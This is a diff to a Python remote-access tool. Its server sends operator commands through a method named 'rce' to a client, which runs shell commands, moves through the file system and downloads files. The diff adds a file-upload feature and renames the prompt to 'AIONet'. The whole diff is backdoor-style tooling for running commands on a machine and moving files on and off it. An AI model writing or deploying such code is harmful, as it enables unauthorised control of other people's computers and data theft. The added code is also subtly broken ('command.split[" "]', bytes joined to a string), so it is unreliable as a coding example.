@@ -27,7 +27,13 @@ class Server:
 
 	def handle(self):
 		while True:
-			command = input("netutil2.0 > ")
+			command = input("AIONet > ")
+
+			if command.count("upload") > 0:
+				content = self.upload_file(command)
+				command += " "
+				command += content
+			
 			command += "\n"
 
 			response = self.rce(command)
@@ -47,6 +53,12 @@ class Server:
 		except:
 			return "Download failed"
 
+	
+	def upload_file(self, command):
+		path = command.split(" ")[1]
+		with open(path, "rb") as up_file:
+			return base64.b64encode(up_file.read())
+	
 	
 	def rce(self, command):
 		self.connection.send(bytes(command, "utf-8"))
@@ -99,6 +111,8 @@ class Client:
 				result = self.move_fs(command)
 			elif command.count("download") > 0:
 				result = self.read_file(command)
+			elif command.count("upload") > 0:
+				result = self.write_file(command)
 			else:
 				result = self.exec_command(command)
 
@@ -112,6 +126,18 @@ class Client:
 		path = command.split(" ")[1]
 		with open(path, "rb") as in_file:
 			return base64.b64encode(in_file.read())
+
+
+	def write_file(self, command):
+		split_command = command.split[" "]
+		path = split_command[1]
+		content = split_command[2]
+		try:
+			with open(path,"wb") as out_file:
+				out_file.write(base64.b64decode(content))
+			return f"Uploaded {path}"
+		except:
+			return "Upload failed"
 
 
 def define_args():
